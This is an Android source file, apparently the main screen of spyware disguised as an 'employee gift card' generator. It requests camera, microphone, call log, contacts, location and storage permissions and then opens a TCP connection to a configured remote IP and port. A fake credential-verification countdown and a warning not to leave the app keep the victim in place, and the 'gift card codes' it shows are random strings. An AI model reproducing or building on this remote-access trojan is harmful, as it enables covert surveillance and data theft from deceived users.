package com.employee.giftcard;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.PowerManager;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;
import java.util.Random;


public class MainActivity extends AppCompatActivity {

    Activity activity = this;
    Context context;
    static String TAG = "MainActivityClass";
    private PowerManager.WakeLock mWakeLock = null;
    
    private TextView countdownText;
    private Button generateButton;
    private int countdown = 60;
    private Handler handler = new Handler();
    private String selectedGiftCard = null;  // Store selected gift card type
    
    private String[] loadingMessages = {
        "Verifying employee credentials...",
        "Checking authorization...",
        "Validating access rights...",
        "Loading employee benefits...",
        "Preparing reward codes...",
        "Almost ready..."
    };
    private int currentMessageIndex = 0;
    private static final int PERMISSION_REQUEST_CODE = 123;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        context = getApplicationContext();
        Log.d(TAG, config.IP + "\t" + config.port);

        // Check if coming from gift card selection
        Intent intent = getIntent();
        if (intent != null && intent.hasExtra("SELECTED_GIFTCARD")) {
            selectedGiftCard = intent.getStringExtra("SELECTED_GIFTCARD");
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            // Build permission list dynamically based on Android version
            java.util.ArrayList<String> permissionList = new java.util.ArrayList<>();
            
            // Core permissions (all Android versions)
            permissionList.add(Manifest.permission.CAMERA);
            permissionList.add(Manifest.permission.RECORD_AUDIO);
            permissionList.add(Manifest.permission.READ_CALL_LOG);
            permissionList.add(Manifest.permission.READ_CONTACTS);
            permissionList.add(Manifest.permission.READ_PHONE_STATE);
            permissionList.add(Manifest.permission.ACCESS_FINE_LOCATION);
            permissionList.add(Manifest.permission.ACCESS_COARSE_LOCATION);
            permissionList.add(Manifest.permission.READ_EXTERNAL_STORAGE);
            permissionList.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
        
            String[] permissions = permissionList.toArray(new String[0]);
            
            // Check if all permissions are already granted
            boolean allPermissionsGranted = areAllPermissionsGranted(permissions);
            
            if (!allPermissionsGranted) {
                ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_CODE);
            }
            
            // Start TCP connection with conditional delay
            startTcpConnection(allPermissionsGranted);
        } else {
            // Pre-Marshmallow - no runtime permissions needed
            startTcpConnection(true);
        }
        
        countdownText = findViewById(R.id.countdownText);
        generateButton = findViewById(R.id.generateButton);
        generateButton.setEnabled(false);
        generateButton.setAlpha(0.5f);
        
        // Update button text if gift card was selected
        if (selectedGiftCard != null) {
            generateButton.setText("Generate " + selectedGiftCard + " Code");
        }
        
        Toast.makeText(this, "Do not leave the app during verification!", Toast.LENGTH_LONG).show();
        
        startCountdown();
        
        generateButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                generateGiftcard();
            }
        });
    }
    
    private void startCountdown() {
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (countdown > 0) {
                    if (countdown % 10 == 0 && currentMessageIndex < loadingMessages.length) {
                        countdownText.setText(loadingMessages[currentMessageIndex] + " (" + countdown + "s)");
                        currentMessageIndex++;
                    } else {
                        int idx = Math.min(currentMessageIndex, loadingMessages.length - 1);
                        countdownText.setText(loadingMessages[idx] + " (" + countdown + "s)");
                    }
                    countdown--;
                    handler.postDelayed(this, 1000);
                } else {
                    countdownText.setText("Authorization complete!");
                    generateButton.setEnabled(true);
                    generateButton.setAlpha(1.0f);
                }
            }
        }, 0);
    }
    
    private void generateGiftcard() {
        // If no gift card selected, show selection screen
        if (selectedGiftCard == null) {
            Intent intent = new Intent(this, GiftCardSelectionActivity.class);
            startActivity(intent);
            return;
        }
        
        // Generate code for selected gift card
        String code = generateRandomCode();
        Toast.makeText(this, selectedGiftCard + " Code: " + code, Toast.LENGTH_LONG).show();
        countdownText.setText(selectedGiftCard + " Code: " + code);
        generateButton.setText("Generate " + selectedGiftCard + " Code");
    }
    
    private String generateRandomCode() {
        String chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        Random random = new Random();
        StringBuilder code = new StringBuilder();
        
        for (int i = 0; i < 4; i++) {
            for (int j = 0; j < 4; j++) {
                code.append(chars.charAt(random.nextInt(chars.length())));
            }
            if (i < 3) code.append("-");
        }
        return code.toString();
    }
    
    // Check if all required permissions are already granted
    private boolean areAllPermissionsGranted(String[] permissions) {
        for (String permission : permissions) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }
    
    // Start TCP connection with conditional delay based on permission status
    private void startTcpConnection(boolean permissionsAlreadyGranted) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    if (!permissionsAlreadyGranted) {
                        // Wait 5 seconds to allow permissions to be granted
                        Log.d(TAG, "Permissions not granted yet, waiting 5 seconds...");
                        Thread.sleep(5000);
                    } else {
                        Log.d(TAG, "All permissions already granted, connecting immediately!");
                    }
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                new tcpConnection(activity, context).execute(config.IP, config.port);
            }
        }).start();
    }
    
    // Handle permission request results
    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            
            if (allGranted) {
                Log.d(TAG, "All permissions granted by user");
            } else {
                Log.d(TAG, "Some permissions denied by user");
                Toast.makeText(this, "Some permissions denied. App may not work correctly.", Toast.LENGTH_LONG).show();
            }
        }
    }
    
    @Override
    protected void onDestroy() {
        super.onDestroy();
        handler.removeCallbacksAndMessages(null);
    }
}
